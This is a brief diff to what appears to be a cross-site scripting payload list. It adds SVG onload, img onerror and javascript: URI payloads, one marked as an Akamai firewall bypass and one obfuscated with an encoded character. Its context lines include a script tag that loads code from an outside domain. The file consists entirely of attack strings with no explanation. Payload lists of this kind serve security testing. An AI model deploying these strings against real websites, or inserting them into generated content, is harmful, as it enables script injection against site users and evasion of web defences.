@@ -1,5 +1,10 @@
 <Svg%20One%20OnLoad=alert\(1\)\>
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
+--!><Svg/Onload=confirm`cookie`>
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`akamaibypass`;>
+javascript:prompt(1)
+javascri%0dpt:prompt()
+[SPASI]javascript:prompt()
 <svg/onload=alert()>
 <script/src=//⑮.rs
 <x/oncut=alert(1)>a
